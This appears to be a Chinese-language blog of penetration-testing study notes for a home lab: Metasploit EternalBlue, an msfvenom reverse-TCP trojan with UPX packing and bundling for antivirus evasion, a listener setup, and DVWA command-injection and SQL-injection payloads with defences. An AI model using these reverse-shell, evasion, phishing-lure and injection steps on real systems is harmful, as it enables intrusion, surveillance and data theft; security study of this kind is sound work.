---
title: 网络安全学习笔记--测试博客
published: 2025-08-01
description: '记录 Metasploit、SQL注入、命令执行等网络安全学习内容'
image: ../../assets/images/blog1.png
tags: [网络安全, 渗透测试, Kali]
category: '安全学习'
draft: false 
lang: ''
---

~~~markdown
# 网络安全学习笔记

## 1. Metasploit 笔记

### 1.1 启动
直接在 Kali 终端输入 `msfconsole` 即可启动 Metasploit 框架。

### 1.2 Metasploit 攻击 Windows 操作

#### 1.2.1 永恒之蓝漏洞利用
目标 IP 地址：`192.168.93.133`

操作步骤：
1. 搜索永恒之蓝模块：`search ms17-010`
2. 选择对应模块：`use exploit/windows/smb/ms17_010_eternalblue`
3. 设置参数：
   ```bash
   set RHOSTS 192.168.93.133  # 目标IP
   set LHOST 你的攻击机IP     # 本地监听IP
~~~

1. 执行攻击：`run`

遇到的问题：

- 靶机未存在该漏洞，即使关闭防火墙并使用同一网段（net 模式）仍无法成功。

### 1.3 常用命令

- 退出 Metasploit：`exit`

## 2. 使用 Kali 渗透工具（msfvenom）生成远程木马

`msfvenom` 是 Metasploit 框架中用于生成恶意 payload 的工具，基本语法：



```bash
msfvenom -p <payload> LHOST=<攻击机IP> LPORT=<端口> -f <格式> > <输出文件名>
```

- `payload`：攻击载荷（如反向连接、绑定端口等）
- `format`：生成文件格式（如 exe、php、apk 等）

### 2.1 钓鱼攻击（基础版，不免杀）

局限性：仅适用于局域网环境

操作流程：

1. 生成木马：

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > demo9999.exe
   ```

2. 在 Metasploit 中启动监听器（见 2.3 节）

3. 诱导目标机运行 `demo9999.exe`

成功控制后可执行的操作：

- 查看目标设备信息
- 开启摄像头：`webcam_snap`（需目标机有摄像头）
- 文件操作、命令执行等

### 2.2 基础免杀技术

1. 捆绑木马：将恶意程序与正常软件捆绑（备注：目前难以绕过火绒等主流杀软）

2. 加壳处理：通过 UPX 等工具对程序加壳，简单隐藏特征码

   

   ```bash
   upx -9 demo9999.exe  # 使用UPX加壳
   ```

### 2.3 `exploit/multi/handler` 模块解析

`exploit/multi/handler` 是 Metasploit 框架中的核心模块，主要作用是作为**通用网络监听器**，专门接收来自目标系统的反向连接。

#### 核心功能

1. 接收反弹连接：处理目标机执行反向 payload 后发起的连接请求
2. 会话管理：创建并维护与目标机的交互式会话

#### 使用场景

当你生成并在目标机执行反向 payload 后（如 `reverse_tcp`），需要通过该模块监听指定端口以接收连接。

#### 操作步骤

1. 加载模块：

   

   ```bash
   use exploit/multi/handler
   ```

2. 配置参数（需与生成 payload 时一致）：

   ```bash
   set payload windows/meterpreter/reverse_tcp  # 与生成的payload匹配
   set LHOST 192.168.1.100                     # 本地监听IP
   set LPORT 4444                              # 本地监听端口
   ```

3. 启动监听：

   ```bash
   run  # 或 exploit
   ```

4. 接收会话：目标机执行 payload 后，会显示类似信息：

   ```plaintext
   [*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.200:49158)
   ```

5. 进入会话：`sessions -i 1`（1 为会话 ID）

#### 注意事项

- payload 类型、LHOST、LPORT 必须与生成的恶意程序完全一致
- 需确保本地防火墙允许监听端口的入站连接
- LHOST 必须是目标机能访问到的 IP 地址

## 3. OWASP TOP 10

OWASP（开放 Web 应用安全项目）每三年更新一次，列出最常见的 10 种 Web 应用安全风险，例如：

- 注入攻击（SQL 注入、命令注入等）
- 失效的身份认证
- 跨站脚本（XSS）
- 安全配置错误
- 日志与监控不足

## 4. DVWA 靶场搭建

DVWA（Damn Vulnerable Web Application）是一个用于学习 Web 安全的漏洞测试平台，搭建步骤：

1. 安装 PHP 环境（推荐使用 XAMPP 或 LAMP 套件）
2. 下载 DVWA 源码并解压到 Web 服务器根目录
3. 访问 `http://localhost/dvwa`，按照提示配置数据库
4. 初始账号密码：`admin/password`

## 5. 命令执行漏洞

### 5.1 漏洞原理

当应用程序未对用户输入的命令进行严格过滤时，攻击者可通过输入特殊字符拼接额外命令，从而控制服务器。

#### 常用命令连接符

- `&`：同时执行前后命令
- `&&`：前命令成功则执行后命令
- `;`：分隔多个命令
- `|`：将前命令输出作为后命令输入
- `||`：前命令失败则执行后命令

### 5.2 实战记录（DVWA Low 级别）

输入：`127.0.0.1&whoami`
结果：成功执行 `whoami` 命令，返回当前用户权限

### 5.3 防御措施

#### 5.3.1 Medium 级别

- 过滤常见命令连接符（如 `&`、`;`、`|` 等）
- 使用白名单限制允许的输入格式

#### 5.3.2 High 级别

- 更严格的字符过滤
- 限制命令参数长度
- 使用系统函数代替直接执行命令

#### 5.3.3 Impossible 级别

- 完全禁止用户输入参与命令执行
- 采用预定义操作列表，仅允许选择而不接受自由输入

## 6. SQL 注入漏洞

### 6.1 漏洞原理

攻击者通过在输入框中插入恶意 SQL 语句，欺骗数据库执行非授权操作，获取或篡改数据。

### 6.2 判断是否存在注入（Low 级别）

1. 在输入框中尝试输入 `1'`，若返回数据库错误，则可能存在注入
2. 输入 `1' and 1=1#` 正常显示，`1' and 1=2#` 无结果，确认存在注入

### 6.3 漏洞利用（Low 级别）

1. 查询数据库表名：

   sql

   

   

   

   

   

   ```sql
   1' union select table_name, table_schema from information_schema.tables where table_schema=BINARY 'dvwa'#
   ```

   > 注意：使用 `BINARY` 关键字可解决 "Illegal mix of collations" 排序规则冲突问题

2. 查询用户表数据：

   sql

   

   

   

   

   

   ```sql
   1' union select user, password from users#
   ```

### 6.4 SQLmap 工具使用

SQLmap 是自动化检测和利用 SQL 注入的工具，Kali 自带，Windows 需先安装 Python 环境。

基本用法：

bash











```bash
python sqlmap.py -u "目标URL" --cookie "登录cookie"
```

操作示例：

1. 获取登录 cookie（Firefox 浏览器）：

   - F12 打开开发者工具 → 网络 → 刷新页面 → 选择请求 → 查看 Cookie 字段

2. 执行检测：

   bash

   

   

   

   

   

   ```bash
   python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=abc123"
   ```

3. 根据提示选择检测选项（通常选 `n` 不进行爆破，仅显示漏洞信息）

### 6.5 防御措施

#### 6.5.1 Medium 级别

- 使用参数化查询（预处理语句）
- 对特殊字符进行转义

#### 6.5.2 High 级别

- 限制 SQL 语句执行权限
- 采用白名单过滤输入内容
- 开启数据库错误信息屏蔽

#### 6.5.3 Impossible 级别

- 完全使用 ORM 框架操作数据库
- 实施严格的输入验证
- 定期审计数据库操作日志

## 7. 信息收集

### 7.1 端口扫描

端口扫描用于发现目标主机开放的端口及对应服务，Windows 可通过 `netstat -ano` 查看自身网络连接状况（端口范围 0~65535）。

#### 7.1.1 Zenmap 使用记录

Zenmap 是 Nmap 的图形化界面，操作步骤：

1. 输入目标 IP：`192.168.93.133`
2. 选择扫描类型（如 `Quick scan` 或自定义命令）
3. 扫描结果示例：

| 端口 | 状态 | 服务 | 版本信息            |
| ---- | ---- | ---- | ------------------- |
| 21   | open | ftp  | vsftpd 3.0.3        |
| 22   | open | ssh  | OpenSSH 7.9p1       |
| 80   | open | http | Apache httpd 2.4.38 |

扫描命令：`nmap -sV 192.168.93.133`（-sV 表示探测服务版本）
